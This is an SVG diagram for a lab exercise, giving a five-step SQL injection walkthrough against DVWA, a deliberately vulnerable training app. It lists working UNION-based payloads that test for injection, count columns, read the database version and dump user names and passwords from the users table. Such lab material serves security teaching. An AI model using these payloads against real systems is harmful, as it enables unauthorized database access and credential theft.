<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1280 720">
  <!-- palette: resources/palette_diagram.yaml -->
  <defs>
    <style id="palette-vars">
      :root, svg {
        --bg: #ffffff;
        --surface: #f5f5f5;
        --border: #e0e0e0;
        --text: #212121;
        --text-muted: #555555;
        --text-faint: #888888;
        --code-bg: #1a1a2e;
        --shadow: #00000022;
        --black: #000000;
        --primary-fill: #2196f3;
        --primary-border: #1565c0;
        --primary-text: #ffffff;
        --primary-accent: #0d47a1;
        --ok-fill: #4caf50;
        --ok-border: #2e7d32;
        --ok-text: #ffffff;
        --ok-accent: #1b5e20;
        --warn-fill: #ff9800;
        --warn-border: #e65100;
        --warn-text: #ffffff;
        --warn-accent: #bf360c;
        --danger-fill: #e74c3c;
        --danger-border: #c62828;
        --danger-text: #ffffff;
        --danger-accent: #b71c1c;
        --info-fill: #9c27b0;
        --info-border: #6a1b9a;
        --info-text: #ffffff;
        --info-accent: #4a148c;
      }
    </style>
    <!-- Gradients -->
    <linearGradient id="grad-primary" x1="0" y1="0" x2="0" y2="1">
      <stop offset="0%" stop-color="#2196f3"/>
      <stop offset="100%" stop-color="#1565c0"/>
    </linearGradient>

    <linearGradient id="grad-surface" x1="0" y1="0" x2="0" y2="1">
      <stop offset="0%" stop-color="#ffffff"/>
      <stop offset="100%" stop-color="#f5f5f5"/>
    </linearGradient>

    <linearGradient id="grad-ok" x1="0" y1="0" x2="0" y2="1">
      <stop offset="0%" stop-color="#4caf50"/>
      <stop offset="100%" stop-color="#2e7d32"/>
    </linearGradient>

    <linearGradient id="grad-warn" x1="0" y1="0" x2="0" y2="1">
      <stop offset="0%" stop-color="#ff9800"/>
      <stop offset="100%" stop-color="#e65100"/>
    </linearGradient>

    <linearGradient id="grad-danger" x1="0" y1="0" x2="0" y2="1">
      <stop offset="0%" stop-color="#e74c3c"/>
      <stop offset="100%" stop-color="#c62828"/>
    </linearGradient>

    <linearGradient id="grad-info" x1="0" y1="0" x2="0" y2="1">
      <stop offset="0%" stop-color="#9c27b0"/>
      <stop offset="100%" stop-color="#6a1b9a"/>
    </linearGradient>

    <!-- Drop shadow -->
    <filter id="shadow" x="-4%" y="-8%" width="108%" height="124%">
      <feDropShadow dx="0" dy="2" stdDeviation="3" flood-color="#00000022"/>
    </filter>

    <!-- Arrow markers -->
    <marker id="arrow" markerWidth="10" markerHeight="10" refX="9" refY="5" orient="auto">
      <path d="M1,2 L9,5 L1,8 Z" fill="#555555"/>
    </marker>
    <marker id="arrow-primary" markerWidth="10" markerHeight="10" refX="9" refY="5" orient="auto">
      <path d="M1,2 L9,5 L1,8 Z" fill="#1565c0"/>
    </marker>
    <marker id="arrow-ok" markerWidth="10" markerHeight="10" refX="9" refY="5" orient="auto">
      <path d="M1,2 L9,5 L1,8 Z" fill="#2e7d32"/>
    </marker>
    <marker id="arrow-warn" markerWidth="10" markerHeight="10" refX="9" refY="5" orient="auto">
      <path d="M1,2 L9,5 L1,8 Z" fill="#e65100"/>
    </marker>
    <marker id="arrow-danger" markerWidth="10" markerHeight="10" refX="9" refY="5" orient="auto">
      <path d="M1,2 L9,5 L1,8 Z" fill="#c62828"/>
    </marker>
    <marker id="arrow-info" markerWidth="10" markerHeight="10" refX="9" refY="5" orient="auto">
      <path d="M1,2 L9,5 L1,8 Z" fill="#6a1b9a"/>
    </marker>
    <marker id="arrow-white" markerWidth="10" markerHeight="10" refX="9" refY="5" orient="auto">
      <path d="M1,2 L9,5 L1,8 Z" fill="#ffffff"/>
    </marker>
</defs>
  <text x="1240" y="40" font-family="sans-serif" font-size="37.714564" font-weight="bold" fill="var(--text)" text-anchor="middle">DVWA SQL Injection — Step-by-Step (Security: Low)</text>
  <text x="1240" y="81.760003" font-family="monospace" font-size="29.632804" fill="var(--text-muted)" text-anchor="middle">URL: /vulnerabilities/sqli/?id=1&amp;Submit=Submit</text>
  <rect x="40" y="114.240045" width="116.129123" height="69.600005" fill="var(--primary-accent)" rx="9.590317" />
  <text x="98.064667" y="160.639968" font-family="sans-serif" font-size="37.714564" font-weight="bold" fill="var(--bg)" text-anchor="middle">1</text>
  <text x="194.838758" y="146.719967" font-family="sans-serif" font-size="35.020644" font-weight="bold" fill="var(--text)">Test for injection</text>
  <text x="194.838758" y="181.51997" font-family="monospace" font-size="29.632804" fill="var(--danger-accent)">id=1'  →  Error (injectable!)</text>
  <rect x="40" y="216.319972" width="116.129123" height="69.600005" fill="var(--primary-accent)" rx="9.590317" />
  <text x="98.064667" y="262.720015" font-family="sans-serif" font-size="37.714564" font-weight="bold" fill="var(--bg)" text-anchor="middle">2</text>
  <text x="194.838758" y="248.800014" font-family="sans-serif" font-size="35.020644" font-weight="bold" fill="var(--text)">Determine number of columns</text>
  <text x="194.838758" y="283.600017" font-family="monospace" font-size="29.632804" fill="var(--text-muted)">id=1' ORDER BY 2-- -  →  Works  |  ORDER BY 3  →  Error  (2 columns)</text>
  <rect x="40" y="327.67998" width="116.129123" height="69.600005" fill="var(--primary-accent)" rx="9.590317" />
  <text x="98.064667" y="374.080023" font-family="sans-serif" font-size="37.714564" font-weight="bold" fill="var(--bg)" text-anchor="middle">3</text>
  <text x="194.838758" y="360.160022" font-family="sans-serif" font-size="35.020644" font-weight="bold" fill="var(--text)">Find display columns</text>
  <text x="194.838758" y="394.960024" font-family="monospace" font-size="29.632804" fill="var(--text-muted)">id=' UNION SELECT 1,2-- -  →  Shows "1" and "2" on page</text>
  <rect x="40" y="439.039988" width="116.129123" height="69.600005" fill="var(--primary-accent)" rx="9.590317" />
  <text x="98.064667" y="485.440031" font-family="sans-serif" font-size="37.714564" font-weight="bold" fill="var(--bg)" text-anchor="middle">4</text>
  <text x="194.838758" y="471.52003" font-family="sans-serif" font-size="35.020644" font-weight="bold" fill="var(--text)">Extract DB version</text>
  <text x="194.838758" y="506.320032" font-family="monospace" font-size="29.632804" fill="var(--text-muted)">id=' UNION SELECT 1,@@version-- -</text>
  <rect x="40" y="550.399995" width="116.129123" height="69.600005" fill="var(--danger-accent)" rx="9.590317" />
  <text x="98.064667" y="596.800038" font-family="sans-serif" font-size="37.714564" font-weight="bold" fill="var(--bg)" text-anchor="middle">5</text>
  <text x="194.838758" y="582.880037" font-family="sans-serif" font-size="35.020644" font-weight="bold" fill="var(--danger-accent)">Dump user credentials</text>
  <text x="194.838758" y="617.68004" font-family="monospace" font-size="29.632804" fill="var(--danger-accent)">id=' UNION SELECT user,password FROM users-- -</text>
</svg>